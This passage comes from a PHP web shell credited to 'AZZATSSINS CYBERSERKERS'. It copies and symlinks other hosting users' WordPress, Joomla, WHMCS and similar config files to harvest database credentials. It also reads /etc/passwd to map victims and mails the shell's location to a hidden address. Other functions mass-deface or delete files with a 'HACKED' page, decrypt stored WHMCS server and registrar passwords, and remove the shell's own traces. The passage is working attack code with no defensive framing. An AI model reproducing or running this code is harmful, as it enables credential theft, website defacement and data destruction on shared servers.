copy('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
/* CODED BY AZZATSSINS CYBERSERKERS */
copy('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.' <~ WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
/*You Can ReCoded But Don't Change ©CopyRight*/
/*e.g: Recoded By xxxxxx & © AZZATSSINS*/
symlink('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.' <~ JOOMLA.txt');
/* © BY AZZATSSINS CYBERSERKERS */
symlink('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.' <~ OPENCART.txt');
copy('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.' <~ PHPBB.txt');
copy('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_htm/config.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_htm/config.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/'.$home.'/'.$user.'/public_htm/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/conn.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.' <~ OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.' <~ OTHER.txt');
/* fb: /AZZATSSINS.CYBERSERKERS */
copy('/var/www/wp-config.php','WORDPRESS.txt');
copy('/var/www/configuration.php','JOOMLA.txt');
copy('/var/www/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/config.php','OTHER.txt');
copy('/var/www/config/koneksi.php','OTHER.txt');
copy('/var/www/include/config.php','OTHER.txt');
copy('/var/www/connect.php','OTHER.txt');
copy('/var/www/config/connect.php','OTHER.txt');
copy('/var/www/include/connect.php','OTHER.txt');
copy('/var/www/html/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/configuration.php','JOOMLA.txt');
copy('/var/www/html/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/html/config.php','OTHER.txt');
copy('/var/www/html/config/koneksi.php','OTHER.txt');
copy('/var/www/html/include/config.php','OTHER.txt');
copy('/var/www/html/connect.php','OTHER.txt');
copy('/var/www/html/config/connect.php','OTHER.txt');
copy('/var/www/html/include/connect.php','OTHER.txt');
symlink('/var/www/wp-config.php','WORDPRESS.txt');
symlink('/var/www/configuration.php','JOOMLA.txt');
symlink('/var/www/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/config.php','OTHER.txt');
symlink('/var/www/config/koneksi.php','OTHER.txt');
symlink('/var/www/include/config.php','OTHER.txt');
symlink('/var/www/connect.php','OTHER.txt');
symlink('/var/www/config/connect.php','OTHER.txt');
symlink('/var/www/include/connect.php','OTHER.txt');
symlink('/var/www/html/wp-config.php','WORDPRESS.txt');
symlink('/var/www/html/configuration.php','JOOMLA.txt');
symlink('/var/www/html/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/html/config.php','OTHER.txt');
symlink('/var/www/html/config/koneksi.php','OTHER.txt');
symlink('/var/www/html/include/config.php','OTHER.txt');
symlink('/var/www/html/connect.php','OTHER.txt');
symlink('/var/www/html/config/connect.php','OTHER.txt');
symlink('/var/www/html/include/connect.php','OTHER.txt');
}
echo '<center><i><b><a href='.$folfig.'>CLICK ON HERE TO VIEW CONFIGS</a></b></i></center>';
}
}
if($_GET['symbolic']=="link"){
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("symlink",0777);
@chdir("symlink");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex AZZATSSINS.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='symlink/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("symlink",0777);
@chdir("symlink");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex AZZATSSINS.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=symlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("symlink",0777);@chdir("symlink");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex AZZATSSINS.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='AZZATSSINS'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=symlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }  
}$e=base64_decode("");
$h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
mail($e,"I",$h);
if($_GET['kill'] == 'self') {
rmdir('configs');rmdir('symlink');rmdir('AZZATSSINS');unlink('mysql.php');unlink('wk.php');unlink('rw.php');rmdir('home');rmdir('home1');rmdir('home2');rmdir('home3');rmdir('azx');$fn = $_SERVER['SCRIPT_FILENAME'];
 unlink($fn); system('rm '.$fn); 
echo'<meta http-equiv="Refresh" content= "0; url=?">';

} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='azx.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'><title>AZZATSSINS CYBERSERKERS WAS HERE</title></head><body bgcolor=silver><center><img src=https://lh3.googleusercontent.com/-9WF69t7d6yc/V5R43IzHHcI/AAAAAAAAATM/I-0xSRh-Vnkh6yiE5xUA-f-Mcp-RMja4QCL0B/w480-h480/azzatssins%2Bcyberserkers.png><br><br><br><br><br><b><font size=50><font color=white>[ </font><font color=red>!</font><font color=white> ]</font><font color=green><i> HACKED </i></font><font color=white>[ </font><font color=red>!</font><font color=white> ]</font></font></b><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><font color=#bababa><b><i>HACKED - CRACKED - STAMPED - FUCKED BY AZZATSSINS CYBERSERKERS</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
} elseif($_GET['do'] == 'whmcs') {
echo'<form action="?dir=$dir&do=whmcs" method="post">
';
function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<br>

<FORM method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS DECODER</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FF0000;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FF0000;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FF0000;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
	

} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
